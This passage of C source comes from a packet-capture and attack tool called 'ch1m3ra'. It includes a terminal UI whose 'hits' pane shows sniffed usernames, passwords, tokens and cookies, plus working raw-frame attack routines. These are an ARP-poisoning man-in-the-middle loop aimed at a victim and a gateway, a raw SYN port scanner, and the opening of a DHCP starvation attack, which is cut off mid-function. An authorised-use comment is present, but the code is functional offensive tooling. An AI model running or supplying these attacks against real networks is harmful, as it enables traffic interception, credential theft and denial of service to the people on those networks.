    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    free(tui.hit[tui.hithead]);
    tui.hit[tui.hithead] = strdup(buf);
    tui.hithead = (tui.hithead + 1) % TUI_LOGMAX;
    if (tui.hitn < TUI_LOGMAX) tui.hitn++;
}

/* compact one-line summary of a packet for the log pane */
static void tui_packet_line(const packet_t *p) {
    char tbuf[16], ifn[IF_NAMESIZE + 8] = "";
    struct tm tm;
    localtime_r(&p->ts.tv_sec, &tm);
    strftime(tbuf, sizeof tbuf, "%H:%M:%S", &tm);
    if (p->ifname[0]) snprintf(ifn, sizeof ifn, " %s", p->ifname);

    char body[400];
    body[0] = 0;
    if (p->has_arp && p->arp_ok) {
        if (p->arp_op == 1) snprintf(body, sizeof body, "who-has %s tell %s", p->arp_tpa, p->arp_spa);
        else if (p->arp_op == 2) {
            char m[24];
            mac_str(p->arp_sha, m, sizeof m);
            snprintf(body, sizeof body, "%s is-at %s", p->arp_spa, m);
        } else snprintf(body, sizeof body, "%s op=%u -> %s", p->arp_spa, p->arp_op, p->arp_tpa);
    } else if (p->ip_ver) {
        char a[144], b[144];
        fmt_ep(p, 1, a, sizeof a);
        fmt_ep(p, 0, b, sizeof b);
        snprintf(body, sizeof body, "%s -> %s", a, b);
        if (p->app_s[0]) {
            size_t l = strlen(body);
            snprintf(body + l, sizeof body - l, "  [%s]", p->app_s);
        }
    } else if (p->has_l2) {
        char a[24], b[24];
        mac_str(p->eth_src, a, sizeof a);
        mac_str(p->eth_dst, b, sizeof b);
        snprintf(body, sizeof body, "%s -> %s type=0x%04x", a, b, p->etype);
    } else snprintf(body, sizeof body, "(unparsed frame)");

    tui_logf("%s.%03ld %-7s%s%4zu  %s%s",
             tbuf, (long)(p->ts.tv_nsec / 1000000),
             p->disp, ifn, p->caplen,
             body, p->err ? "  !" : "");

    /* surface anything operationally interesting in the hits panel */
    if (p->cred_kind)
        tui_hitf("%s [%s] %s:%u->%s:%u user=%s pass=%s", tbuf, p->cred_where,
                 p->src_s, p->sport, p->dst_s, p->dport, p->cred_user, p->cred_pass);
    else if (p->token[0])
        tui_hitf("%s TOKEN %s:%u->%s:%u %s %s", tbuf, p->src_s, p->sport,
                 p->dst_s, p->dport, p->token, p->jwt_sub);
    else if (p->cookie[0])
        tui_hitf("%s COOKIE %s:%u->%s:%u %s", tbuf, p->src_s, p->sport,
                 p->dst_s, p->dport, p->cookie);
    if (p->banner[0]) tui_hitf("%s BANNER %s %s", tbuf, p->svc, p->banner);
    if (p->os_guess[0]) tui_hitf("%s OS %s => %s", tbuf, p->src_s, p->os_guess);
}

static void tui_clear_log(void) {
    for (int i = 0; i < TUI_LOGMAX; i++) {
        free(tui.line[i]); tui.line[i] = NULL;
        free(tui.hit[i]);  tui.hit[i] = NULL;
    }
    tui.logn = tui.loghead = tui.scroll = 0;
    tui.hitn = tui.hithead = 0;
}

/* return the i-th visible log line (0 = oldest kept) */
static const char *tui_line_at(int i) {
    if (i < 0 || i >= tui.logn) return "";
    int start = (tui.logn == TUI_LOGMAX) ? tui.loghead : 0;
    return tui.line[(start + i) % TUI_LOGMAX] ? tui.line[(start + i) % TUI_LOGMAX] : "";
}

/* return the i-th visible hit line (0 = oldest kept) */
static const char *tui_hit_at(int i) {
    if (i < 0 || i >= tui.hitn) return "";
    int start = (tui.hitn == TUI_LOGMAX) ? tui.hithead : 0;
    return tui.hit[(start + i) % TUI_LOGMAX] ? tui.hit[(start + i) % TUI_LOGMAX] : "";
}

static void tui_render(int rows, int cols) {
    char out[8192];
    size_t n = 0;
#define TUI_ADD(...) do {                                            \
        if (n < sizeof out) {                                        \
            int _w = snprintf(out + n, sizeof out - n, __VA_ARGS__); \
            if (_w > 0) n += (size_t)_w;                             \
            if (n >= sizeof out) n = sizeof out - 1;                 \
        }                                                            \
    } while (0)
    TUI_ADD("\x1b[H\x1b[2J");

    /* header */
    TUI_ADD(
        "\x1b[1;37m ch1m3ra " VERSION " \x1b[0m  %s\x1b[0m  "
        "%scap %llu\x1b[0m  %sshow %llu\x1b[0m  %sfilt %llu\x1b[0m  %sbad %llu\x1b[0m"
        "%s\r\n",
        tui.running ? "\x1b[92m● RUNNING" : "\x1b[93m■ STOPPED",
        "\x1b[90m", st.cap, "\x1b[92m", st.shown, "\x1b[90m", st.filtered,
        "\x1b[91m", st.bad,
        tui.hitn ? "\x1b[91m  ⚑ hits\033[0m" : "");

    if (cols < 40) cols = 40;
    int logrows = rows - 4;
    if (logrows < 1) logrows = 1;

    /* protocol histogram line */
    char hist[256];
    size_t h = 0;
#define HIST_ADD(...) do {                                             \
        if (h < sizeof hist) {                                         \
            int _w = snprintf(hist + h, sizeof hist - h, __VA_ARGS__);  \
            if (_w > 0) h += (size_t)_w;                                \
            if (h >= sizeof hist) h = sizeof hist - 1;                 \
        }                                                              \
    } while (0)
    HIST_ADD("\x1b[90m");
    for (int i = 0; i < 8; i++)
        if (st.b[i]) HIST_ADD("%s %llu  ", bucket_name(i), st.b[i]);
    if (st.a[0] || st.a[1] || st.a[2])
        HIST_ADD("| dns %llu tls %llu http %llu", st.a[0], st.a[1], st.a[2]);
    if (cfg.harvest) HIST_ADD("| creds %llu", st.creds);
    if (cfg.finger)  HIST_ADD("| hosts %u", hn);
    HIST_ADD("\x1b[0m");
    TUI_ADD("%s\r\n", hist);

    /* which pane is showing */
    int showing_hits = (tui.panel == 1);
    int total = showing_hits ? tui.hitn : tui.logn;
    int top = total - logrows - tui.scroll;
    if (top > total - logrows) top = total - logrows;
    if (top < 0) top = 0;
    char meta[160];
    snprintf(meta, sizeof meta, "\x1b[90m[%s] -- %d/%d%s --\x1b[0m",
             showing_hits ? "hits: creds/tokens/banners/os" : "packets",
             top, total, tui.scroll ? " (scrolled, G=tail)" : "");
    TUI_ADD("%s\r\n", meta);

    for (int r = 0; r < logrows; r++) {
        const char *ln = showing_hits ? tui_hit_at(top + r) : tui_line_at(top + r);
        /* truncate to terminal width so wrapping never breaks the layout */
        int maxw = cols - 1;
        char tmp[512];
        snprintf(tmp, sizeof tmp, "%.*s", maxw, ln);
        TUI_ADD("%-*.*s\r\n", maxw, maxw, tmp);
        if (n > sizeof out - 700) { fwrite(out, 1, n, stdout); n = 0; }
    }

    /* footer / keys */
    TUI_ADD(
        "\x1b[1;37m s\x1b[0m %s  \x1b[1;37mx\x1b[0m stop  "
        "\x1b[1;37mj/k\x1b[0m scroll  \x1b[1;37mg/G\x1b[0m top/tail  "
        "\x1b[1;37mp\x1b[0m pane:%s  \x1b[1;37mc\x1b[0m clear  "
        "\x1b[1;37mf\x1b[0m follow:%s  \x1b[1;37mq\x1b[0m quit",
        tui.running ? "stop" : "start",
        showing_hits ? "hits" : "pkts",
        tui.follow_on ? "\x1b[92mALL\x1b[0m" : "off");

    fwrite(out, 1, n, stdout);
    fflush(stdout);
#undef TUI_ADD
#undef HIST_ADD
}

/* drain pending keys; returns 0 to keep running, 1 to quit */
static int tui_keys(void) {
    char buf[64];
    ssize_t n;
    int quit = 0;
    while ((n = read(STDIN_FILENO, buf, sizeof buf)) > 0) {
        for (ssize_t i = 0; i < n; i++) {
            switch (buf[i]) {
                case 'q': case 3: quit = 1; break;               /* q / Ctrl-C */
                case 's': tui.running = 1; break;
                case 'x': tui.running = 0; break;
                case ' ': tui.running = !tui.running; break;      /* pause/resume */
                case 'c': tui_clear_log(); break;
                case 'p': tui.panel = !tui.panel; tui.scroll = 0; break;
                case 'f':
                    tui.follow_on = !tui.follow_on;
                    cfg.follow = tui.follow_on ? 0 : -1;
                    break;
                case 'j': tui.scroll++; break;
                case 'k': if (tui.scroll > 0) tui.scroll--; break;
                case 'g': tui.scroll = 1 << 30; break;
                case 'G': tui.scroll = 0; break;
                default: break;
            }
        }
    }
    if (g_stop) quit = 1;
    return quit;
}

static int tui_run(void) {
    if (!isatty(STDOUT_FILENO)) {
        fprintf(stderr, "ch1m3ra: -U needs a terminal (stdout is not a tty)\n");
        return 2;
    }
    cfg.dumpbytes = 0;
    tui.follow_on = (cfg.follow >= 0);
    tui_active = 1;

    /* capture starts only when the user presses 's' (unless it's a pcap file,
     * where there is nothing to wait for - autostart so -r -U shows data) */
    tui.running = cap.pcap_mode ? 1 : 0;

    tui_enter_raw();
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = tui_panic;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    fputs("\x1b[?1049h\x1b[?25l", stdout);    /* alt screen, cursor off */
    fflush(stdout);

    static uint8_t buf[65536];
    size_t capbuf = (size_t)(cfg.snaplen < 65536 ? cfg.snaplen : 65536);
    int needs_render = 1;
    struct timespec last_render = {0, 0};

    for (;;) {
        if (tui_keys()) break;

        if (tui.running) {
            const uint8_t *frame = buf;
            size_t capn = 0, wire = 0;
            struct timespec ts = {0, 0};
            int have_dir = 0, out = 0;
            char ifn[IF_NAMESIZE] = "";

            int rc = capture_next(buf, capbuf, &frame, &capn, &wire, &ts,
                                  &have_dir, &out, ifn);
            if (rc == 1) {
                process_frame(frame, capn, wire, &ts, ifn, have_dir, out);
                needs_render = 1;
                if (cfg.count > 0 && (long long)st.shown >= cfg.count) tui.running = 0;
                continue;               /* keep draining without waiting */
            }
            if (rc == 0) {              /* EOF / source gone */
                tui.running = 0;
                if (cap.pcap_mode) tui_logf("--- end of file ---");
                needs_render = 1;
            } else if (rc == -1) {
                tui.running = 0;
                needs_render = 1;
            }
            /* rc == 2: nothing ready yet */
        }

        struct winsize ws = {0};
        if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) != 0 || ws.ws_row == 0) {
            ws.ws_row = 24; ws.ws_col = 80;
        }
        if (needs_render) {
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            long dms = (now.tv_sec - last_render.tv_sec) * 1000
                     + (now.tv_nsec - last_render.tv_nsec) / 1000000;
            if (dms >= 50 || last_render.tv_sec == 0) {
                tui_render(ws.ws_row, ws.ws_col);
                needs_render = 0;
                last_render = now;
            }
        }

        /* wait briefly for input so keys are responsive and stopped mode
         * doesn't burn CPU (also refreshes the panel while idle) */
        struct pollfd p = { .fd = STDIN_FILENO, .events = POLLIN };
        int pr = poll(&p, 1, tui.running ? 20 : 100);
        if (pr < 0 && errno != EINTR) break;
        if (pr == 0) needs_render = 1;   /* idle tick: repaint counters */
    }

    tui_term_restore();
    tui_active = 0;
    tui_clear_log();

    if (cap.wf) { fclose(cap.wf); cap.wf = NULL; }
    if (cap.pcap_mode && cap.pr.f) { fclose(cap.pr.f); cap.pr.f = NULL; }
    if (cap.fd >= 0) { ring_stats(cap.fd); close(cap.fd); cap.fd = -1; }
    if (ring_map) munmap(ring_map, ring_len);
    streams_cleanup();
    if (g_stop) return 0;
    return 0;
}

/* ---------- capture source (shared by plain loop and TUI) ---------- */

/* read the next frame into buf; returns 1 = frame, 0 = EOF/stop, -1 = error */
static int capture_next(uint8_t *buf, size_t bufsz, const uint8_t **frame_out,
                        size_t *cap_out, size_t *wire, struct timespec *ts,
                        int *have_dir, int *out, char *ifn) {
    size_t capn = 0, wiren = 0;
    int hd = 0, o = 0, rc;
    const uint8_t *frame = buf;

    ifn[0] = 0;
    if (cap.pcap_mode) {
        rc = pcapin_next(&cap.pr, buf, bufsz, &capn, &wiren, ts);
        if (rc <= 0) return rc;
        snprintf(ifn, IF_NAMESIZE, "file");
    } else if (ring_on) {
        uint8_t *rp = NULL;
        int rrc = ring_next(cap.fd, &rp, &capn, &wiren, ts, &hd, &o, ifn);
        if (rrc != 1) return rrc;               /* 0 = stop, 2 = no frame yet */
        frame = rp;
    } else {
        struct sockaddr_ll sl;
        socklen_t slen = sizeof sl;
        ssize_t n = recvfrom(cap.fd, buf, bufsz, 0, (struct sockaddr *)&sl, &slen);
        if (n < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
                return 2;                          /* caller decides (tui polls) */
            fprintf(stderr, "ch1m3ra: recvfrom: %s\n", strerror(errno));
            return -1;
        }
        capn = (size_t)n;
        wiren = capn;
        clock_gettime(CLOCK_REALTIME, ts);
        if (sl.sll_ifindex && if_indextoname(sl.sll_ifindex, ifn) == NULL)
            snprintf(ifn, IF_NAMESIZE, "if%d", sl.sll_ifindex);
        hd = 1;
        o = (sl.sll_pkttype == PACKET_OUTGOING);
    }
    *frame_out = frame;
    *cap_out = capn;
    *wire = wiren;
    *have_dir = hd;
    *out = o;
    return 1;
}

/* decode + filter + record one frame; returns 1 if it was displayed */
static int process_frame(const uint8_t *frame, size_t capn, size_t wire,
                         const struct timespec *ts, const char *ifn,
                         int have_dir, int out) {
    st.cap++;
    st.bytes += capn;
    if ((cap.pcap_mode || cfg.evasion) && cfg.bfilter && !bpf_run(frame, (uint32_t)capn)) {
        st.filtered++;
        return 0;
    }
    packet_t pkt;
    decode(&pkt, frame, capn, wire, ts, ifn, have_dir, out);
    stream_track(&pkt);
    if (!pass_filter(&pkt)) { st.filtered++; return 0; }
    if (cap.wf) pcap_write(cap.wf, frame, capn, wire, ts);
    if (cfg.follow < 0) {
        if (tui_active) tui_packet_line(&pkt);
        else print_record(&pkt);
    }
    st.shown++;
    if (pkt.malformed) st.bad++;
    st.b[bucket(&pkt)]++;
    if (pkt.app == APP_DNS) st.a[0]++;
    else if (pkt.app == APP_TLS) st.a[1]++;
    else if (pkt.app == APP_HTTP) st.a[2]++;
    return 1;
}

/* ---------- raw frame crafting + transmit (active tools) ----------
 * Everything below builds Ethernet frames by hand and sends them on an
 * AF_PACKET socket.  These require root and an explicit flag; they put real
 * packets on the wire.  Use only on networks you own or are authorised to
 * test.  Ctrl-C stops them and, for ARP, restores the poisoned caches.      */

typedef struct {
    int   fd;
    int   ifindex;
    uint8_t mac[6];             /* our interface MAC */
    char  ifname[IF_NAMESIZE];
} tx_t;

static tx_t tx;

static int tx_open(const char *iface) {
    if (!iface) { fprintf(stderr, "ch1m3ra: active tool needs -i <iface>\n"); return -1; }
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) {
        fprintf(stderr, "ch1m3ra: socket(AF_PACKET): %s\n", strerror(errno));
        if (errno == EPERM)
            fprintf(stderr, "ch1m3ra: active tools need root (or cap_net_raw)\n");
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, sizeof ifr.ifr_name, "%s", iface);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "ch1m3ra: no such interface: %s\n", iface);
        close(fd); return -1;
    }
    tx.ifindex = ifr.ifr_ifindex;
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "ch1m3ra: SIOCGIFHWADDR: %s\n", strerror(errno));
        close(fd); return -1;
    }
    memcpy(tx.mac, ifr.ifr_hwaddr.sa_data, 6);
    snprintf(tx.ifname, sizeof tx.ifname, "%s", iface);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = tx.ifindex;
    if (bind(fd, (struct sockaddr *)&sll, sizeof sll) < 0) {
        fprintf(stderr, "ch1m3ra: bind %s: %s\n", iface, strerror(errno));
        close(fd); return -1;
    }
    tx.fd = fd;
    return 0;
}

static int tx_send(const uint8_t *frame, size_t len) {
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = tx.ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, frame, 6);
    ssize_t n = sendto(tx.fd, frame, len, 0, (struct sockaddr *)&sll, sizeof sll);
    return n == (ssize_t)len ? 0 : -1;
}

/* ---- frame builders ---- */

/* Ethernet + ARP (op 1 request / 2 reply), sender IP/MAC + target IP/MAC */
static size_t build_arp(uint8_t *f, uint16_t op,
                        const uint8_t *smac, const uint8_t *sip,
                        const uint8_t *tmac, const uint8_t *tip) {
    memcpy(f, tmac, 6);
    memcpy(f + 6, smac, 6);
    f[12] = 0x08; f[13] = 0x06;
    uint8_t *a = f + 14;
    a[0] = 0; a[1] = 1;
    a[2] = 0x08; a[3] = 0x00;
    a[4] = 6; a[5] = 4;
    a[6] = op >> 8; a[7] = (uint8_t)op;
    memcpy(a + 8, smac, 6);
    memcpy(a + 14, sip, 4);
    memcpy(a + 18, tmac, 6);
    memcpy(a + 24, tip, 4);
    return 14 + 28;
}

/* Ethernet + IPv4 + TCP; returns frame length.  Computes both checksums. */
static size_t build_tcp(uint8_t *f, const uint8_t *smac, const uint8_t *dmac,
                        const uint8_t *sip, const uint8_t *dip,
                        uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
                        uint8_t flags, const uint8_t *payload, size_t plen) {
    memcpy(f, dmac, 6); memcpy(f + 6, smac, 6);
    f[12] = 0x08; f[13] = 0x00;
    uint8_t *ip = f + 14;
    size_t tcp_len = 20 + plen;
    size_t ip_len = 20 + tcp_len;
    ip[0] = 0x45; ip[1] = 0;
    ip[2] = (uint8_t)(ip_len >> 8); ip[3] = (uint8_t)ip_len;
    ip[4] = 0; ip[5] = 0;
    ip[6] = 0x40; ip[7] = 0;                 /* DF */
    ip[8] = 64;                              /* TTL */
    ip[9] = 6;                               /* TCP */
    memcpy(ip + 12, sip, 4); memcpy(ip + 16, dip, 4);
    ip[10] = ip[11] = 0;
    ip[10] = (uint8_t)(ck_fold(ck_add(0, ip, 20)) >> 8);
    ip[11] = (uint8_t)ck_fold(ck_add(0, ip, 20));

    uint8_t *t = ip + 20;
    t[0] = (uint8_t)(sport >> 8); t[1] = (uint8_t)sport;
    t[2] = (uint8_t)(dport >> 8); t[3] = (uint8_t)dport;
    t[4] = (uint8_t)(seq >> 24); t[5] = (uint8_t)(seq >> 16);
    t[6] = (uint8_t)(seq >> 8); t[7] = (uint8_t)seq;
    t[8] = (uint8_t)(ack >> 24); t[9] = (uint8_t)(ack >> 16);
    t[10] = (uint8_t)(ack >> 8); t[11] = (uint8_t)ack;
    t[12] = 0x50;                            /* data offset 5, no options */
    t[13] = flags;
    t[14] = 0xff; t[15] = 0xff;              /* window */
    t[16] = t[17] = 0;                       /* checksum placeholder */
    t[18] = t[19] = 0;
    if (plen && payload) memcpy(t + 20, payload, plen);

    /* TCP pseudo-header checksum */
    uint32_t s = 0;
    s = ck_add(s, sip, 4);
    s = ck_add(s, dip, 4);
    s += 6;
    s += (uint32_t)tcp_len;
    s = ck_add(s, t, tcp_len);
    uint16_t ck = ck_fold(s);
    t[16] = (uint8_t)(ck >> 8); t[17] = (uint8_t)ck;
    return 14 + ip_len;
}

/* Ethernet + IPv4 + UDP (used for DHCP) */
static size_t build_udp(uint8_t *f, const uint8_t *smac, const uint8_t *dmac,
                        const uint8_t *sip, const uint8_t *dip,
                        uint16_t sport, uint16_t dport, const uint8_t *payload, size_t plen) {
    memcpy(f, dmac, 6); memcpy(f + 6, smac, 6);
    f[12] = 0x08; f[13] = 0x00;
    uint8_t *ip = f + 14;
    size_t udp_len = 8 + plen;
    size_t ip_len = 20 + udp_len;
    ip[0] = 0x45; ip[1] = 0;
    ip[2] = (uint8_t)(ip_len >> 8); ip[3] = (uint8_t)ip_len;
    ip[4] = 0; ip[5] = 0;
    ip[6] = 0; ip[7] = 0;
    ip[8] = 64;
    ip[9] = 17;                              /* UDP */
    memcpy(ip + 12, sip, 4); memcpy(ip + 16, dip, 4);
    ip[10] = ip[11] = 0;
    uint16_t ipck = ck_fold(ck_add(0, ip, 20));
    ip[10] = (uint8_t)(ipck >> 8); ip[11] = (uint8_t)ipck;

    uint8_t *u = ip + 20;
    u[0] = (uint8_t)(sport >> 8); u[1] = (uint8_t)sport;
    u[2] = (uint8_t)(dport >> 8); u[3] = (uint8_t)dport;
    u[4] = (uint8_t)(udp_len >> 8); u[5] = (uint8_t)udp_len;
    u[6] = u[7] = 0;
    if (plen && payload) memcpy(u + 8, payload, plen);
    /* UDP checksum (optional for v4, but compute it) */
    uint32_t s = 0;
    s = ck_add(s, sip, 4);
    s = ck_add(s, dip, 4);
    s += 17;
    s += (uint32_t)udp_len;
    s = ck_add(s, u, udp_len);
    uint16_t ck = ck_fold(s);
    if (!ck) ck = 0xffff;
    u[6] = (uint8_t)(ck >> 8); u[7] = (uint8_t)ck;
    return 14 + ip_len;
}

/* resolve an IPv4 string to 4 bytes + its MAC via ARP (best-effort) */
static int arp_resolve(int fd, int ifindex, const uint8_t *our_mac,
                       const uint8_t *our_ip, const uint8_t *target_ip, uint8_t *mac_out);

/* ---- --arp-poison ---- */
static void arp_poison_run(const char *spec, const char *iface) {
    char buf[256];
    snprintf(buf, sizeof buf, "%s", spec);
    char *victim = strtok(buf, ",");
    char *gw = strtok(NULL, ",");
    char *if2 = strtok(NULL, ",");
    if (!victim || !gw) {
        fprintf(stderr, "ch1m3ra: --arp-poison needs <victim>,<gateway>[,<iface>]\n");
        exit(2);
    }
    const char *dev = if2 ? if2 : iface;
    if (!dev) { fprintf(stderr, "ch1m3ra: --arp-poison needs an interface (-i or 3rd field)\n"); exit(2); }

    uint8_t vip[4], gip[4];
    if (inet_pton(AF_INET, victim, vip) != 1 || inet_pton(AF_INET, gw, gip) != 1) {
        fprintf(stderr, "ch1m3ra: --arp-poison needs IPv4 addresses\n"); exit(2);
    }
    if (tx_open(dev) != 0) exit(1);

    fprintf(stderr, "%s== ARP poison ==%s iface %s  victim %s  gateway %s\n",
            CRED, C0, dev, victim, gw);
    fprintf(stderr, "ch1m3ra: sending forged ARP to MITM %s <-> %s. Ctrl-C stops.\n",
            victim, gw);

    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    /* learn both MACs so we can answer directly */
    uint8_t ourip[4] = {0,0,0,0};
    uint8_t vmac[6], gmac[6];
    memset(vmac, 0, 6); memset(gmac, 0, 6);
    arp_resolve(tx.fd, tx.ifindex, tx.mac, ourip, vip, vmac);
    arp_resolve(tx.fd, tx.ifindex, tx.mac, ourip, gip, gmac);

    uint8_t f[64];
    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL); sigaction(SIGTERM, &sa, NULL);

    int rounds = 0;
    while (!g_stop) {
        /* tell victim: gateway IP is at our MAC */
        size_t n = build_arp(f, 2, tx.mac, gip, vmac[0] ? vmac : bcast, vip);
        tx_send(f, n);
        /* tell gateway: victim IP is at our MAC */
        n = build_arp(f, 2, tx.mac, vip, gmac[0] ? gmac : bcast, gip);
        tx_send(f, n);
        if (++rounds % 5 == 0)
            fprintf(stderr, "ch1m3ra: arp-poison round %d sent\n", rounds);
        struct timespec ts = {1, 0};
        nanosleep(&ts, NULL);
    }
    /* restore: send the true bindings a few times */
    fprintf(stderr, "ch1m3ra: restoring ARP caches...\n");
    for (int i = 0; i < 5; i++) {
        if (vmac[0]) { size_t n = build_arp(f, 2, vmac, gip, tx.mac, vip); tx_send(f, n); }
        if (gmac[0]) { size_t n = build_arp(f, 2, gmac, vip, tx.mac, gip); tx_send(f, n); }
        struct timespec ts = {0, 200000000};
        nanosleep(&ts, NULL);
    }
    close(tx.fd);
}

/* parse "22,80,443" or "1-1024" into ports[]; returns count */
static int parse_ports(const char *s, long *ports, int maxp) {
    int n = 0;
    while (s && *s && n < maxp) {
        char *end = NULL;
        long a = strtol(s, &end, 10);
        s = end;
        long b = a;
        if (s && *s == '-') {
            s++;
            b = strtol(s, &end, 10);
            s = end;
        }
        if (b < a) { long t = a; a = b; b = t; }
        if (a < 1) a = 1;
        if (b > 65535) b = 65535;
        for (long p = a; p <= b && n < maxp; p++) ports[n++] = p;
        if (s && *s) s++;      /* skip the ',' / '-' separator */
    }
    return n;
}

/* wait for a frame matching our filter; returns byte length, or -1 on timeout */
static ssize_t rx_wait(int fd, uint8_t *b, size_t sz, int timeout_ms) {
    struct pollfd p = { .fd = fd, .events = POLLIN };
    int rc = poll(&p, 1, timeout_ms);
    if (rc <= 0) return -1;
    struct sockaddr_ll sll; socklen_t sl = sizeof sll;
    return recvfrom(fd, b, sz, 0, (struct sockaddr *)&sll, &sl);
}

static int arp_resolve(int fd, int ifindex, const uint8_t *our_mac,
                       const uint8_t *our_ip, const uint8_t *target_ip, uint8_t *mac_out) {
    (void)ifindex;
    uint8_t f[64], rbuf[2048];
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    /* source IP unknown here (caller passes zeros); use 0.0.0.0 probe */
    size_t n = build_arp(f, 1, our_mac, our_ip, bcast, target_ip);
    if (tx_send(f, n) != 0) return -1;
    for (int tries = 0; tries < 3; tries++) {
        ssize_t got = rx_wait(fd, rbuf, sizeof rbuf, 300);
        if (got < 42) continue;
        if (rbuf[12] != 0x08 || rbuf[13] != 0x06) continue;
        if (rbuf[20] != 0 || rbuf[21] != 2) continue;      /* ARP reply */
        if (memcmp(rbuf + 14 + 14, target_ip, 4) != 0) continue;
        memcpy(mac_out, rbuf + 14 + 8, 6);
        return 0;
    }
    return -1;
}

/* ---- --syn-scan ---- */
static void syn_scan_run(const char *spec, const char *iface) {
    if (!iface) { fprintf(stderr, "ch1m3ra: --syn-scan needs -i <iface>\n"); exit(2); }
    char host[128]; snprintf(host, sizeof host, "%s", spec);
    char *colon = strrchr(host, ':');
    const char *portspec = "1-1024";
    if (colon) { *colon = 0; portspec = colon + 1; }

    uint8_t dip[4];
    if (inet_pton(AF_INET, host, dip) != 1) {
        fprintf(stderr, "ch1m3ra: --syn-scan needs an IPv4 host (got %s)\n", host); exit(2);
    }
    static long ports[65536];
    int np = parse_ports(portspec, ports, 65536);
    if (np <= 0) { fprintf(stderr, "ch1m3ra: no ports to scan\n"); exit(2); }

    if (tx_open(iface) != 0) exit(1);
    fprintf(stderr, "%s== SYN scan ==%s %s (%d ports) on %s\n", CRED, C0, host, np, iface);

    /* resolve target MAC (uses ARP; needs our IP for a clean probe) */
    uint8_t ourip[4] = {0,0,0,0};
    uint8_t dmac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    struct ifreq ifr; memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, sizeof ifr.ifr_name, "%s", iface);
    if (ioctl(tx.fd, SIOCGIFADDR, &ifr) == 0)
        memcpy(ourip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    if (ourip[0]) arp_resolve(tx.fd, tx.ifindex, tx.mac, ourip, dip, dmac);

    uint8_t sip[4]; memcpy(sip, ourip, 4);
    uint8_t f[128];
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    if (!sip[0]) { fprintf(stderr, "ch1m3ra: could not determine local IP\n"); exit(1); }
    if (dmac[0] == 0xff) memcpy(dmac, bcast, 6);

    int open_ct = 0, closed_ct = 0, filt_ct = 0;
    for (int i = 0; i < np && !g_stop; i++) {
        uint16_t sport = (uint16_t)(40000 + (i % 20000));
        size_t n = build_tcp(f, tx.mac, dmac, sip, dip, sport, (uint16_t)ports[i],
                             0x12345678u, 0, 0x02 /* SYN */, NULL, 0);
        tx_send(f, n);
        /* wait briefly for SYN/ACK (open) or RST (closed) */
        int verdict = 0;   /* 0 filtered */
        for (int t = 0; t < 3 && !verdict; t++) {
            uint8_t rbuf[2048];
            ssize_t got = rx_wait(tx.fd, rbuf, sizeof rbuf, 120);
            if (got < 54) break;                       /* need eth+ip+tcp */
            if (rbuf[12] != 0x08 || rbuf[13] != 0x00) continue;
            size_t ihl = (size_t)(rbuf[14] & 0xf) * 4;
            if (ihl < 20 || (size_t)got < 14 + ihl + 20) continue;
            if (rbuf[14 + 9] != 6) continue;
            if (memcmp(rbuf + 14 + 12, dip, 4) != 0) continue;   /* src must be target */
            uint8_t *t2 = rbuf + 14 + ihl;
            uint16_t rsp = rd16(t2);       /* src port in reply */
            uint16_t rdp = rd16(t2 + 2);   /* dst port = our source port */
            if (rdp != sport || rsp != (uint16_t)ports[i]) continue;
            uint8_t flags = t2[13];
            if (flags & 0x12) verdict = 1;        /* SYN|ACK = open */
            else if (flags & 0x04) verdict = 2;   /* RST = closed */
            /* send RST to tear down half-open */
            if (verdict == 1) {
                size_t rn = build_tcp(f, tx.mac, dmac, sip, dip, sport,
                                      (uint16_t)ports[i], rd32(t2 + 8), 0,
                                      0x04, NULL, 0);
                tx_send(f, rn);
            }
        }
        if (verdict == 1) { printf("%-6ld open\n", ports[i]); open_ct++; }
        else if (verdict == 2) closed_ct++;
        else filt_ct++;
    }
    printf("ch1m3ra: scan done: %d open, %d closed, %d filtered\n",
           open_ct, closed_ct, filt_ct);
    close(tx.fd);
}

/* ---- --dhcp-starve ---- */
static void dhcp_starve_run(const char *spec, const char *iface) {
    char buf[128]; snprintf(buf, sizeof buf, "%s", spec);
    char *colon = strrchr(buf, ':');
    long count = 256;
    if (colon) { *colon = 0; count = atol(colon + 1); if (count <= 0) count = 256; }
    const char *dev = buf[0] ? buf : iface;
    if (!dev) { fprintf(stderr, "ch1m3ra: --dhcp-starve needs <iface>[:<count>]\n"); exit(2); }
    if (tx_open(dev) != 0) exit(1);

    fprintf(stderr, "%s== DHCP starvation ==%s %s -> %ld random clients. Ctrl-C stops.\n",
            CRED, C0, dev, count);

    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t anyip[4] = {0,0,0,0};
    uint8_t bcastip[4] = {255,255,255,255};
    uint8_t f[512];
    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL);

    long sent = 0;
    for (long i = 0; i < count && !g_stop; i++) {
        uint8_t d[300];
        memset(d, 0, sizeof d);
